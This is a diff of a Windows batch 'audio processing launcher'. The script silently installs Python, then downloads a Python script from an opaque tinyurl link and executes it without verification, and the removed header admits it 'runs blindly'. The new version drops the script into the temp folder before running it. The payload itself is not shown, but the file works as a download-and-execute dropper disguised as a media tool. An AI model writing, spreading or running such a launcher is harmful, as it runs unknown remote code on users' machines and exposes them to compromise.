@@ -1,63 +1,40 @@
 @echo off
-REM ========================================
-REM Minimal 3D Audio Processing Launcher
-REM Installs Python, downloads script, runs blindly
-REM ========================================
-
 setlocal
 
-:: --- Detect Python ---
-set PYTHON_EXE=
-for %%P in (
-    "%ProgramFiles%\Python312\python.exe"
-    "%LocalAppData%\Programs\Python\Python312\python.exe"
-    "%ProgramFiles%\Python311\python.exe"
-    "%LocalAppData%\Programs\Python\Python311\python.exe"
-) do (
-    if exist "%%P" set PYTHON_EXE=%%P
-)
-
-:: --- Install Python if not found ---
-IF "%PYTHON_EXE%"=="" (
-    echo Python not found! Installing Python 3.12...
-    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile 'python_installer.exe'"
-    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
-    del python_installer.exe
-
-    for %%P in (
-        "%ProgramFiles%\Python312\python.exe"
-        "%LocalAppData%\Programs\Python\Python312\python.exe"
-    ) do (
-        if exist "%%P" set PYTHON_EXE=%%P
-    )
-
-    IF "%PYTHON_EXE%"=="" (
-        echo Python installation failed. Please install manually.
-        pause
-        exit /b 1
-    )
-    echo Python installed successfully.
-)
-
-:: --- Upgrade pip and install dependencies ---
-"%PYTHON_EXE%" -m ensurepip
-"%PYTHON_EXE%" -m pip install --upgrade pip numpy scipy pydub
-
-:: --- Download Python script ---
-set PY_SCRIPT=pa1112.py
-IF NOT EXIST "%PY_SCRIPT%" (
-    echo Downloading Python script...
-    powershell -Command "Invoke-WebRequest -Uri 'https://tinyurl.com/ARBYAUDIO2' -OutFile '%PY_SCRIPT%'"
-    IF %ERRORLEVEL% NEQ 0 (
-        echo Failed to download Python script.
+:: ------------------------------
+:: Check for Python
+:: ------------------------------
+where python >nul 2>nul
+if %ERRORLEVEL% NEQ 0 (
+    echo Python not found. Downloading latest Python...
+    :: Download Python installer (latest stable 3.x)
+    set PYTHON_INSTALLER=%TEMP%\python-installer.exe
+    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe' -OutFile '%PYTHON_INSTALLER%'"
+    echo Installing Python silently...
+    "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+    if %ERRORLEVEL% NEQ 0 (
+        echo Python installation failed.
         pause
         exit /b 1
     )
 )
 
-:: --- Run Python script ---
-echo Running Python script...
-"%PYTHON_EXE%" "%PY_SCRIPT%"
+:: Ensure Python is available
+set PYTHON_BIN=python
+%PYTHON_BIN% --version >nul 2>nul
+if %ERRORLEVEL% NEQ 0 (
+    set PYTHON_BIN=python3
+)
 
-echo Done.
+:: ------------------------------
+:: Download Python script
+:: ------------------------------
+set PY_SCRIPT=%TEMP%\arby_audio.py
+powershell -Command "Invoke-WebRequest -Uri 'https://tinyurl.com/ARBYAUDIO2' -OutFile '%PY_SCRIPT%'"
+
+:: ------------------------------
+:: Execute Python script
+:: ------------------------------
+%PYTHON_BIN% "%PY_SCRIPT%"
+endlocal
 pause
